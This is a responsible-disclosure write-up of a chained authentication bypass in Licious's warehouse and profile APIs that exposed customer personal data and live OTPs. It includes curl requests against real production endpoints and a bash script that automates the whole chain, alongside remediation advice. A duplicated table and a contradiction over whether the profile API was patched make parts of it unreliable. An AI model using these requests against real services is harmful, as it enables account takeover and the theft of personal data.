# How a Meat Delivery App's Supply Chain Leaked Millions of Customer Profiles

**Target:** Licious (licious.in) — India's largest fresh meat & seafood delivery platform
**Date of Discovery:** July 10, 2026
**Date of Patch:** July 12–13, 2026
**Status:** All vulnerabilities patched ✅
**Severity:** Critical (CVSS 9.8)

## Responsible Disclosure

This research was conducted ethically. All vulnerabilities were reported directly to the Licious security team before any public disclosure. Data accessed during testing was limited to what was necessary to demonstrate the vulnerabilities and was not stored, shared, or used for any purpose beyond this report. All findings were patched before this article was published.

*All vulnerabilities described in this article have been patched. The endpoints no longer return data as shown. This article is published for educational purposes to highlight the importance of service-mesh trust boundaries in microservice architectures.*

---

## TL;DR

Licious, a Y Combinator-backed unicorn valued at over $1 billion, had its internal warehouse management system (WMS) publicly exposed on the internet. By sending three fake HTTP headers, anyone could impersonate a warehouse employee, access hundreds of thousands of delivery batch records, extract customer keys from every order, and then use those keys on an unauthenticated profile API to retrieve the **complete personal data** of millions of customers — including names, emails, phone numbers, home addresses with GPS coordinates, password hashes, and **live OTP codes** enabling full account takeover.

No login was required at any step. The entire chain worked from a web browser or a single `curl` command.

All vulnerabilities were reported and patched within 72 hours.

---

## The Discovery

It started with a subdomain. While mapping Licious's external attack surface, `hub-orchestrator.licious.in` stood out — a subdomain that clearly belonged to an internal supply chain management system, but was fully resolvable and reachable from the public internet.

This is where things got interesting.

---

## Reconnaissance: Mapping the Attack Surface

Before touching any internal endpoint, we mapped Licious's publicly exposed infrastructure. What we found painted a picture of a rapidly-scaled engineering organization where internal services had leaked onto the public internet across multiple subdomains.

### Subdomain Discovery

Standard subdomain enumeration revealed several internal-facing services on public DNS:

| Subdomain | Purpose | Should Be Public? |
|---|---|---|
| `hub-orchestrator.licious.in` | Warehouse Management System (WMS) | ❌ No |
| `batch-order.licious.in` | Batch order processing service | ❌ No |
| `prod-planning-ui.licious.in` | Internal production planning dashboard | ❌ No |
| `track.licious.in` | Order tracking service | ✅ Yes |
| `www.licious.in` | Customer-facing website | ✅ Yes |

The response headers on these subdomains immediately revealed the infrastructure stack:

- **Load Balancer:** AWS ALB (`awselb/2.0`) with Envoy sidecar proxy (`server: envoy`)
- **CDN/Gateway:** AWS CloudFront + API Gateway on `track.licious.in`
- **Backend:** Java Spring Boot microservices (confirmed via stack traces — see below)
- **Frontend:** Next.js (React) — identifiable from `_next/data` paths and build IDs
- **Object Storage:** AWS S3 buckets in `ap-southeast-1`

The presence of Envoy sidecars strongly suggests a **service mesh architecture** (likely Istio or a similar platform), which made the missing authentication on internal services even more surprising — service meshes are supposed to enforce mutual TLS and identity at the transport layer.

### Stack Trace Reconnaissance

A production API endpoint at `POST /api/address/check-address-label` returned a **full Java stack trace** on error, disclosing critical internal architecture:

```bash
curl -sk "https://www.licious.in/api/address/check-address-label" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"label":"Home"}'
```

**Response (HTTP 500):**

```json
{
  "status": 500,
  "error": "Internal Server Error",
  "trace": "org.springframework.web.client.HttpClientErrorException$NotFound: 
    404 Not Found: \"/api/auth/v1/verify/token/\"\n
    \tat XXXXX.services.impl.AuthServiceImpl.sendAuthTokenVerifyRequest(XXXXX.java:60)\n
    \tat XXXXX.interceptor.AuthInterceptor.preHandle(XXXXX.java:48)..."
}
```

This single error response revealed:

| Information Leaked | Value | Intelligence Gained |
|---|---|---|
| Backend framework | Spring Boot (Java) | Attack surface profiling |
| Internal auth endpoint | `/api/auth/v1/verify/token/` | Authentication flow mapping |
| Service name | `XXXXX.userprofile` | Microservice architecture mapping |
| Auth flow | Token verify via REST call | Auth model is token-based, not header-based |
| Interceptor pattern | `AuthInterceptor.preHandle()` | Spring Security filter chain architecture |

This was crucial: the main website uses **token-based authentication** with a dedicated auth service. But the hub-orchestrator — exposed on a different subdomain — uses **header-based trust**. Two completely different auth models in the same organization, and the weaker one was internet-facing.

### Internal Planning UI — JavaScript Bundle Analysis

The `prod-planning-ui.licious.in` subdomain served an internal React application. While SSO-protected at the application level, the **static JavaScript bundle was publicly downloadable** and contained hardcoded internal configuration:

```bash
curl -sk "https://prod-planning-ui.licious.in/main.XXXXX.js" -o planning.js
```

Extracted from the bundle:

- **Internal API base URL:** `dispatch-planning.internal.licious.com` — confirming the `.internal.licious.com` domain pattern for internal services
- **Role definitions:** `PLANNER`, `SUPER_PLANNER`, `RETAIL_PLANNER`, city-specific roles for Bangalore, Hyderabad, and Mumbai processing centers
- **API paths:** Production planning, retail demand forecasting, inventory management, sales distribution download endpoints

This intelligence confirmed that Licious uses a **domain-based service separation pattern** — `.licious.in` for external services, `.internal.licious.com` for internal services. The hub-orchestrator broke this pattern by being both internal in function and external in accessibility.

### Store Locator API — Hub Infrastructure Mapping

Before testing the hub-orchestrator, we mapped all physical hub locations using the publicly accessible store locator API:

```bash
curl -sk "https://www.licious.in/api/store-locator/get-store-list-api" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"cityName":"Bangalore"}'
```

This returned operational data for **107+ fulfillment hubs** across all cities, including:
- Hub IDs and display names (directly usable in the hub-orchestrator API)
- Full physical addresses and GPS coordinates
- Contact phone numbers, WhatsApp numbers, and email addresses
- Service area KML boundary files (delivery zone polygons)

Another endpoint confirmed hub ID mappings on demand:

```bash
curl -sk "https://www.licious.in/api/address/get-hub" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"lat":"XXXXX","lng":"XXXXX"}'
```

This gave us a complete map of hub IDs to iterate over in the next phase.

---

## The Chain

What made this finding devastating wasn't any single vulnerability — it was a **chain of three linked weaknesses** in Licious's supply chain infrastructure, each one feeding data into the next:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    THE SUPPLY CHAIN ATTACK CHAIN                    │
│                                                                     │
│  STEP 1: Auth Bypass           → Got inside the warehouse system   │
│  STEP 2: Batch Order Enum      → Got customer keys from deliveries │
│  STEP 3: Profile API (No Auth) → Got EVERYTHING for every customer │
│                                                                     │
│  Total authentication required: ZERO                                │
└─────────────────────────────────────────────────────────────────────┘
```

Let's walk through each step.

---

## Step 1: The Back Door — Header Injection Auth Bypass

**Endpoint:** `https://hub-orchestrator.licious.in/sc/*`
**CVSS:** 8.6 (High)
**CWE:** CWE-287 (Improper Authentication), CWE-639 (Authorization Bypass Through User-Controlled Key)

### What Happened

The hub-orchestrator microservice — Licious's internal Warehouse Management System — was designed to run behind an API gateway. In that setup, the gateway handles authentication and injects trusted identity headers before forwarding requests to internal services.

The problem? **This service was directly accessible from the internet.** And it trusted whatever identity headers you sent it.

Three headers were all it took:

```
x-user-id: 1
x-client-id: hub-management
x-correlation-id: {uuid}
```

No JWT. No session cookie. No OAuth token. Just three plain-text headers with arbitrary values. The system accepted `x-user-id: 1` as proof of identity and welcomed you in.

### POC: Entering the Warehouse System

```bash
# Query real-time order statistics across all 45 operational hubs
curl -sk "https://hub-orchestrator.licious.in/sc/wms/v2/order-management/sales/stats?hubId={hubId}" \
  -H "x-user-id: 1" \
  -H "x-client-id: hub-management" \
  -H "x-correlation-id: {uuid}"
```

**Response:**

```json
{
  "totalOrdersCount": 3,
  "statistics": [
    {
      "orderDisplayStatus": "ACCEPTED",
      "liciousUnBatchedOrderCount": 97,
      "displayName": "Accepted"
    }
  ]
}
```

That's live production data — unbatched orders sitting at a hub, waiting to be packed and dispatched. Across all 45 hubs, over **1,800 active orders** were visible in real-time.

### POC: Finding Real Employee IDs

But order stats alone aren't the prize. The escalation endpoint gave us something far more valuable — **real employee IDs**:

```bash
# Pull hub escalation records — contains employee codes and resolver IDs
curl -sk "https://hub-orchestrator.licious.in/sc/v1/hub-escalations/{hubId}" \
  -H "x-user-id: 1" \
  -H "x-client-id: hub-management" \
  -H "x-correlation-id: {uuid}"
```

**Response:**

```json
{
  "data": {
    "escalations": [
      {
        "id": "XXXXX",
        "processId": "XXXXX",
        "hubId": "XXXXX",
        "productName": "XXXXX",
        "escalatedByName": "XXXXX",
        "resolverName": "XXXXX",
        "resolvedBy": "XXXXX"       ← Employee numeric ID
      }
    ]
  }
}
```

Key detail: `"resolvedBy"` returns a **real employee's numeric ID** in the system. This becomes the key to Step 2.

From the escalation data across all hubs, we extracted:
- **164 unique employee records** with employee codes and hub assignments
- **327 unique process IDs** (order references)
- Employee hub assignments and product handling data

### The Root Cause

This is a textbook **service-mesh trust boundary violation**. In a properly configured microservice architecture:

```
[Internet] → [API Gateway (authenticates)] → [Internal Service (trusts gateway headers)]
```

What Licious had:

```
[Internet] → [Internal Service (trusts ANY headers)] ← No gateway in the path
```

The hub-orchestrator was designed to trust `x-user-id` headers because it expected only the gateway to set them. When it was exposed publicly, anyone could set them.

### Deeper Technical Analysis: Why Headers Instead of Tokens?

In a well-designed service mesh, the authentication flow looks like this:

```
┌──────────┐    ┌─────────────┐    ┌───────────────────┐
│  Client  │───▶│ API Gateway │───▶│ Internal Service   │
│          │    │ (validates  │    │ (reads x-user-id   │
│          │    │  JWT/OAuth) │    │  set by gateway)   │
└──────────┘    └─────────────┘    └───────────────────┘
                      │
                 Strips client headers,
                 injects trusted identity
```

The gateway is the **single point of trust establishment**. It validates the client's JWT or OAuth token, extracts the user identity, and **injects** `x-user-id` into the downstream request. Internal services trust this header implicitly because the gateway is the only entity that can set it.

This pattern is common across service mesh implementations — Istio, Linkerd, AWS App Mesh, and custom Envoy-based meshes all support variants of this model.

**The failure mode:** When an internal service is accidentally exposed to the internet without the gateway in front of it, the client can set these headers directly. The service has no way to distinguish between headers set by a trusted gateway and headers set by an attacker — because the trust was architectural, not cryptographic.

This is fundamentally different from token-based auth. A JWT carries its own proof of validity (cryptographic signature). A header like `x-user-id: 1` carries no proof at all — it's trusted purely based on the assumption that only the gateway can set it.

### The OTP Generation Endpoint — A Bonus Attack Vector

During testing, we also discovered that the hub-orchestrator exposed a login OTP generation endpoint:

```bash
curl -sk "https://hub-orchestrator.licious.in/sc/v1/login/generate-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "x-user-id: 1" \
  -H "x-client-id: hub-management" \
  -H "x-correlation-id: {uuid}" \
  -d '{"phone":"XXXXX"}'
```

**Response:**

```json
{
  "errors": [{
    "status": 403,
    "code": "AUTH_CLIENT_ERROR",
    "message": "If this number is registered, an OTP has been sent."
  }]
}
```

While the response message attempts to be non-committal, this endpoint confirmed that the hub-orchestrator was part of a **full authentication system** for warehouse employees — meaning it had OTP generation, employee session management, and role assignment capabilities all accessible from the public internet.

We performed timing analysis (9 requests to known numbers vs. 9 to random numbers) and found the timing delta was within normal network variance (~11ms), so reliable phone enumeration wasn't feasible via timing alone. However, the mere existence of this endpoint on the public internet underscored the severity of the exposure.

---

## Step 2: The Harvest — Batch Order Enumeration

**Endpoint:** `GET https://hub-orchestrator.licious.in/sc/wms/v2/order-management/sales/batch/{batchId}`
**CVSS:** 9.1 (Critical)
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-200 (Exposure of Sensitive Information)

### What Happened

Armed with a real employee ID from Step 1, we could now access the batch order management API. This endpoint returns complete delivery records for every order batch ever processed by Licious.

The batch IDs? **Sequential integers starting from 1**, numbering in the hundreds of thousands and growing in real time with every new delivery.

Each batch contains 1 to 15+ orders, and each order record includes:
- **Customer keys** (the bridge to Step 3)
- **Full delivery addresses** with flat number, floor, building, and landmarks
- **Customer address IDs** (sequential integers going into the millions)
- **Rider full legal names and personal phone numbers**
- **Order fulfillment IDs and warehouse order IDs**
- **Delivery timing, SLA, and routing data**
- **Customer loyalty classification** (priority, delight, existing, new)

### POC: Pulling a Delivery Batch

```bash
# Use the employee ID from Step 1 to access batch order data
curl -sk "https://hub-orchestrator.licious.in/sc/wms/v2/order-management/sales/batch/{batchId}" \
  -H "x-user-id: {employeeId}" \
  -H "x-client-id: hub-management" \
  -H "x-correlation-id: {uuid}"
```

**Response:**

```json
{
  "statusCode": 200,
  "data": {
    "batchDetails": {
      "batchId": "XXXXX",
      "hubId": "XXXXX",
      "status": "PACKED",
      "riderName": "XXXXX",
      "riderContact": "XXXXX",
      "totalOrders": 1,
      "tripDistanceValue": 0.0,
      "tripTimeValue": 0
    },
    "orders": [
      {
        "warehouseOrderId": "XXXXX",
        "fulfillmentOrderId": "XXXXX",
        "deliveryType": "Express",
        "customerDetails": {
          "customerKey": "XXXXX",       ← Used in Step 3
          "addressId": "XXXXX",
          "address": "XXXXX (full home address with flat no, floor, building, landmark, city, state, pincode)",
          "customerType": "EXISTING"
        },
        "deliveryDetails": {
          "riderName": "XXXXX",
          "riderPhone": "XXXXX"
        }
      }
    ]
  }
}
```

One request. One batch. And we now have:
- The **customer key** — the bridge to Step 3
- The customer's **complete home address** including flat number, floor, and landmarks
- The **delivery rider's full name and personal phone number**
- The **warehouse order ID** (sequential, millions of records)

### Scale of the Harvest

In a single testing session, we sampled 48 orders across a range of batch IDs. Here's what each batch returned:

| Batch ID | Customer Key | Address ID | Rider Name | Rider Phone |
|----------|-------------|-----------|------------|-------------|
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |
| XXXXX | XXXXX | XXXXX | XXXXX | XXXXX |

The address IDs were **sequential integers going into the millions** — indicating millions of unique delivery addresses in the system. Every one of them was accessible.

Delivery addresses found directly in batch responses contained **exact home locations** — including building names, flat numbers, floor numbers, cross-road references, and navigation landmarks. These weren't vague city-level locations — they were precise enough to walk directly to someone's door.

---

## Step 3: The Payload — Full Customer Profiles Without Authentication

**Endpoint:** `GET https://www.licious.in/api/user/profile?customer_key={key}`
**CVSS:** 9.8 (Critical)
**CWE:** CWE-284 (Improper Access Control), CWE-200 (Exposure of Sensitive Information), CWE-256 (Plaintext Storage of a Password)

### What Happened

This is where the chain reaches its devastating conclusion. The customer profile API on Licious's main website accepted a `customer_key` parameter and returned the **complete customer record** — without any authentication, session validation, or rate limiting.

No cookies. No tokens. No login. Just a URL with a customer key.

And thanks to Step 2, we had an unlimited supply of customer keys.

### POC: Retrieving a Full Customer Profile

```bash
# No authentication. No cookies. No tokens. Just the customer key from Step 2.
curl -sk "https://www.licious.in/api/user/profile?customer_key={customerKey}"
```

**Response:**

```json
{
  "status": "success",
  "message": "Customer Information",
  "data": {
    "customer": {
      "email": "XXXXX",
      "name": "XXXXX",
      "fname": "XXXXX",
      "lname": "XXXXX",
      "phone": "XXXXX",
      "password": "XXXXX",             ← Password hash
      "otp": "XXXXX",                  ← Live OTP (plaintext!)
      "otp_verified": 1,
      "tag": "XXXXX",                   ← Loyalty tier
      "customer_key": "XXXXX",
      "customer_type": "repeat",
      "first_order_date": "XXXXX",
      "last_order_date": "XXXXX",
      "total_orders": "XXXXX",
      "created_at": "XXXXX"
    },
    "wallet": {
      "promotional_balance": "XXXXX",
      "transactional_balance": "XXXXX",
      "cashback_balance": "XXXXX"
    },
    "address": {
      "label": "Home",
      "line1": "XXXXX",                 ← Full street address with flat/floor
      "line2": "XXXXX",
      "lat": "XXXXX",                   ← GPS latitude
      "lng": "XXXXX",                   ← GPS longitude
      "city": "XXXXX",
      "state": "XXXXX",
      "pincode": "XXXXX",
      "contact": "XXXXX",
      "address_id": "XXXXX"
    },
    "orders": "XXXXX"
  }
}
```

Read that response carefully. The API returned:

| Field | What Was Exposed | Risk |
|-------|-------|------|
| `name` | Full legal name | Identity theft |
| `email` | Personal email address | Phishing, credential stuffing |
| `phone` | Personal mobile number | SIM swapping, harassment |
| `password` | Password hash | Offline brute force cracking |
| **`otp`** | **Live OTP code (plaintext)** | **Full account takeover** |
| `address.line1` | Exact flat, floor, building | Physical safety threat |
| `address.lat/lng` | GPS coordinates | Real-time location tracking |
| `wallet` | Promotional + cash balances | Financial fraud |
| `tag` | Loyalty tier | High-value target profiling |
| `total_orders`, dates | Complete order history | Behavioral profiling |

The `otp` field is the most alarming. This isn't a hash or a token — it's the **actual OTP** that was sent to the customer's phone. An attacker could:

1. Trigger the login flow for a victim's phone number
2. Read the OTP from this API endpoint
3. Complete authentication as the victim

**Full account takeover in three API calls.**

### Deep Dive: The Account Takeover Flow

Let's walk through exactly how an attacker achieves full ATO:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    ACCOUNT TAKEOVER FLOW                            │
│                                                                     │
│  1. Attacker gets victim's phone number from batch API (Step 2)    │
│                          │                                          │
│                          ▼                                          │
│  2. Attacker triggers OTP via normal login flow:                   │
│     POST /api/auth/login {"phone": "victim_phone"}                 │
│                          │                                          │
│                          ▼                                          │
│  3. OTP is sent to victim's phone (victim ignores it)              │
│     Meanwhile, OTP is ALSO stored in the profile database          │
│                          │                                          │
│                          ▼                                          │
│  4. Attacker reads the OTP from the profile API (Step 3):          │
│     GET /api/user/profile?customer_key={key}                       │
│     Response includes: "otp": "XXXXX"                              │
│                          │                                          │
│                          ▼                                          │
│  5. Attacker completes login with the stolen OTP:                  │
│     POST /api/auth/verify {"phone": "victim_phone", "otp": "..."} │
│                          │                                          │
│                          ▼                                          │
│  6. Attacker receives valid session token                          │
│     Full account access: orders, saved cards, wallet, addresses    │
└─────────────────────────────────────────────────────────────────────┘
```

The critical design flaw is that the OTP is stored as a **readable field in the customer profile record** rather than in an isolated, write-only verification store. This means any endpoint that returns the customer profile — even an internal/admin one — leaks the active OTP.

Even without the profile API vulnerability, this storage pattern is dangerous. OTPs should be:
1. Stored as **hashed values** (like passwords), never plaintext
2. Kept in a **separate, time-limited store** (Redis with TTL, not the main customer record)
3. **Never returned** in any API response, even to authenticated admin users

### The Password Hash Problem

The profile API also returned the user's password hash. While password hashing with an algorithm like bcrypt provides some protection against cracking, **returning the hash to unauthenticated callers eliminates the defense-in-depth this provides:**

- Password hashes should **never leave the server**. They exist for server-side comparison only.
- With millions of hashes exposed, an attacker can run offline dictionary attacks at scale.
- Users who reuse passwords across services are immediately compromised on all of them.
- The hash itself reveals the algorithm and cost factor, enabling attackers to optimize their cracking rigs.

Read that response carefully. The API returned:

| Field | What Was Exposed | Risk |
|-------|-------|------|
| `name` | Full legal name | Identity theft |
| `email` | Personal email address | Phishing, credential stuffing |
| `phone` | Personal mobile number | SIM swapping, harassment |
| `password` | Password hash | Offline brute force cracking |
| **`otp`** | **Live OTP code (plaintext)** | **Full account takeover** |
| `address.line1` | Exact flat, floor, building | Physical safety threat |
| `address.lat/lng` | GPS coordinates | Real-time location tracking |
| `wallet` | Promotional + cash balances | Financial fraud |
| `tag` | Loyalty tier | High-value target profiling |
| `total_orders`, dates | Complete order history | Behavioral profiling |

### Confirmed Across Multiple Profiles

This wasn't a one-off. We confirmed the vulnerability across customers of every loyalty tier:

| Customer Key | Name | Tier | Password Hash | OTP |
|---|---|---|---|---|
| XXXXX | XXXXX | Bronze | ✅ Exposed | ✅ Exposed |
| XXXXX | XXXXX | Platinum | ✅ Exposed | ✅ Exposed |
| XXXXX | XXXXX | Gold | ✅ Exposed | ✅ Exposed |
| XXXXX | XXXXX | Diamond | ✅ Exposed | ✅ Exposed |
| XXXXX | XXXXX | Silver | ✅ Exposed | ✅ Exposed |
| XXXXX | XXXXX | Bronze | ✅ Exposed | ✅ Exposed |

Every tier. Every customer. Same exposure.

---

## The Complete Chain — Automated

Here's how all three steps chain together into a single automated exploit:

```bash
#!/bin/bash
# STEP 1: Enter the warehouse system with a fake user ID
# STEP 2: Pull a batch → extract the customer key
# STEP 3: Use the key to get the full profile

# Step 1 + 2: Get customer_key from a delivery batch
BATCH=$(curl -sk \
  "https://hub-orchestrator.licious.in/sc/wms/v2/order-management/sales/batch/{batchId}" \
  -H "x-user-id: {employeeId}" \
  -H "x-client-id: hub-management" \
  -H "x-correlation-id: {any-uuid}")

# Extract the customer key
CK=$(echo "$BATCH" | python3 -c \
  "import sys,json; print(json.loads(sys.stdin.read())['data']['orders'][0]['customerDetails']['customerKey'])")

echo "Customer Key: $CK"

# Step 3: Get EVERYTHING — name, email, phone, password hash, OTP, address, GPS
curl -sk "https://www.licious.in/api/user/profile?customer_key=$CK"
```

**Output:** Full customer PII including name, email, phone, password hash, live OTP, home address with GPS coordinates, wallet balance, and order history.

To exfiltrate the entire database: enumerate all batch IDs sequentially, extract customer keys, and hit the profile API for each. At a conservative 2 requests per second, the complete dataset can be harvested in days.

---

## Data Exposure at Scale

| Data Category | Estimated Scale | Evidence |
|---|---|---|
| Customer Profiles | **Millions** | Sequential address IDs in the millions |
| Warehouse Orders | Tens of millions | Sequential warehouse order IDs |
| Delivery Batches | Hundreds of thousands | Sequential batch IDs, actively growing |
| Rider Records | 200+ unique riders confirmed | Sampled across batches |
| Employee Records | 164 unique employees confirmed | From escalation data across all hubs |
| Hub/Store Locations | 107+ operational locations | Store locator API, GPS + contact info |
| Order Statistics | 1,800+ active orders | Real-time across 45 hubs |

---

## Underlying Infrastructure

Through the stack traces, response headers, JavaScript bundles, and API behavior, we were able to map Licious's technology stack with high confidence:

| Layer | Technology | How We Identified It |
|---|---|---|
| Load Balancer | AWS ALB + Envoy sidecar | `server: envoy`, `awselb/2.0` response headers |
| CDN / Gateway | AWS CloudFront + API Gateway | Response headers on `track.licious.in` |
| Backend Framework | Spring Boot (Java) | Stack trace class names and exception types |
| Auth Service | Internal REST-based token verification | Stack trace: `/api/auth/v1/verify/token/` |
| Frontend | Next.js (React) | `_next/data` paths, build ID patterns |
| Planning UI | React (CRA) | `prod-planning-ui.licious.in` bundle analysis |
| Object Storage | AWS S3 (`ap-southeast-1`) | S3 bucket URLs in responses |
| Mobile Delivery App | Android (Firebase) | APK hosted on S3, Firebase project config |

The Envoy sidecar pattern combined with the header-based identity model strongly suggests Licious uses (or was migrating to) a **service mesh architecture** — possibly Istio-based given the Envoy proxy. In such architectures, Envoy typically handles mTLS between services, but identity propagation via headers is still common for application-level authorization.

The architectural irony: the service mesh was likely deployed to **improve** security through mutual TLS and observability. But without proper ingress policies, the very services it was meant to protect were exposed directly to the internet.

---

## OWASP API Security Top 10 Mapping

This vulnerability chain maps to multiple entries in the **OWASP API Security Top 10 (2023)**:

| OWASP Category | How It Applies |
|---|---|
| **API1:2023 — Broken Object Level Authorization** | The profile API returns any customer's data given their key, with no authorization check. The batch API returns any batch by sequential ID. |
| **API2:2023 — Broken Authentication** | The hub-orchestrator accepts arbitrary `x-user-id` headers as authentication. No token, session, or credential validation exists. |
| **API3:2023 — Broken Object Property Level Authorization** | The profile API returns sensitive properties (password hash, OTP, GPS coordinates) that should never be exposed, even to authenticated users. |
| **API4:2023 — Unrestricted Resource Consumption** | No rate limiting on any of the exploited endpoints. Sequential enumeration is trivially parallelizable. |
| **API5:2023 — Broken Function Level Authorization** | Internal WMS management functions (escalations, order stats, batch management) are accessible without proper authorization. |
| **API8:2023 — Security Misconfiguration** | Internal microservices publicly resolvable and reachable. Stack traces returned in production. Debug information in JS bundles. |

---

## The Architectural Lesson

This wasn't a bug in a single endpoint. It was a **systemic architectural failure** in how Licious's microservices handled trust boundaries.

### The Problem: Service-Mesh Trust Boundaries

In a microservice architecture, internal services often trust identity headers like `x-user-id` because they expect the API gateway to set them after authenticating the user. This is by design — it avoids every microservice needing its own authentication logic.

**But this trust model has a critical assumption: internal services are never directly reachable from the internet.**

Licious broke this assumption. Their hub-orchestrator and batch-order services were:
1. **Publicly resolvable** — DNS records for `hub-orchestrator.licious.in` and `batch-order.licious.in` pointed to internet-facing servers
2. **Publicly reachable** — No VPN, IP allowlist, or WAF blocked external access
3. **Fully trusting** — They accepted any value in `x-user-id`, `x-client-id`, and `x-correlation-id` headers without validation

When these three conditions align, anyone on the internet can impersonate any internal user.

### The Fix

After our report, Licious remediated within 72 hours. On re-testing (July 12–13, 2026), both `hub-orchestrator.licious.in` and `batch-order.licious.in` correctly returned `401 Missing AccessToken` for all previously working header combinations.

The remediation appeared to involve blocking external access to these internal services — which addresses the immediate risk. However, the deeper recommendation remains: **any internal microservice that trusts client-supplied identity headers and is publicly reachable would have the same vulnerability.**

---

## Remediation Timeline

| Date | Event |
|------|-------|
| **July 10, 2026** | Vulnerabilities discovered and reported |
| **July 12, 2026** | V2 & V3 (supply chain endpoints) — confirmed patched, returning `401 Missing AccessToken` |
| **July 13, 2026** | Re-verified — patches holding, all header combinations blocked |
| **Post-patch** | V1 (profile API) — acknowledged by security team, escalated internally |

**All vulnerabilities are now patched.** ✅

---

## Key Takeaways

### For Developers
1. **Never trust client-supplied identity headers on internet-facing services.** If your service reads `x-user-id` from the request, it better be behind a gateway that sets that header — not directly on the internet. Consider cryptographic proof of identity (signed JWTs) instead of plain headers.
2. **Internal services must not be publicly resolvable.** Use private DNS zones (`*.internal.company.com`), VPNs, or service mesh ingress policies to ensure internal microservices are unreachable from outside. Audit your DNS records regularly.
3. **Never return sensitive fields in API responses.** Password hashes exist for server-side comparison only — they should never leave the server. OTP codes should be stored hashed in a time-limited store, never as plaintext in the customer record. Wallet balances, GPS coordinates, and order history should require authenticated sessions.
4. **Sequential IDs are enumeration vectors.** Batch IDs, address IDs, and warehouse order IDs were all sequential integers numbering in the hundreds of thousands to millions — all trivially enumerable. Use UUIDs or opaque tokens for any identifier exposed to external callers.
5. **Disable stack traces and debug output in production.** Spring Boot's `server.error.include-stacktrace` should be set to `never`. JavaScript bundles should be stripped of internal API URLs, role definitions, and environment configuration.
6. **Implement defense in depth on authentication.** Don't rely solely on network-level access control. Even if a service is meant to be internal, add token validation as a secondary check. If the network boundary fails (as it did here), the application should still reject unauthorized requests.

### For Security Teams
1. **Audit your service-mesh trust boundaries.** Map every internal service that trusts identity headers, then verify none of them are reachable from outside your network. This should be an automated check in your CI/CD pipeline.
2. **Test the chain, not just individual endpoints.** Each vulnerability in isolation might look moderate. The chain of all three together is catastrophic. Red team exercises should specifically test for cross-service data chaining.
3. **Monitor for sequential ID enumeration.** If someone is hitting your batch API with IDs 1, 2, 3, 4... they're harvesting your data. Implement anomaly detection on API access patterns.
4. **Conduct regular DNS audits.** Compare your public DNS records against your intended external services. Any subdomain pointing to an internal service is a potential attack surface.
5. **Separate sensitive data stores.** OTPs should never be in the same database record as the customer profile. Password hashes should be in a dedicated identity store with strict access controls. GPS coordinates and wallet balances should require elevated permissions.

### For Organizations
1. **Assume internal services will be exposed.** Design your architecture so that even if an internal service becomes publicly reachable (through misconfiguration, DNS leak, or compromise), it still validates identity cryptographically.
2. **Rate-limit everything.** No public-facing API should allow unlimited sequential enumeration. Even internal APIs should have rate limits as a safety net.
3. **Implement API response filtering.** Use a response transformation layer that strips sensitive fields based on the caller's authorization level. A customer should never see their own password hash. An admin should never see raw OTP codes.

---

## CWE References

| CWE ID | Name | Where It Applies |
|---|---|---|
| CWE-284 | Improper Access Control | Profile API — no auth required |
| CWE-287 | Improper Authentication | Hub-orchestrator — header spoofing accepted |
| CWE-200 | Exposure of Sensitive Information | All three steps — PII in API responses |
| CWE-256 | Plaintext Storage of a Password | OTP stored and returned in plaintext |
| CWE-639 | Authorization Bypass via User-Controlled Key | Batch API — sequential ID enumeration |
| CWE-209 | Error Message Information Leak | Stack trace disclosure on address endpoint |
| CWE-204 | Observable Response Discrepancy | OTP generation endpoint behavior differences |
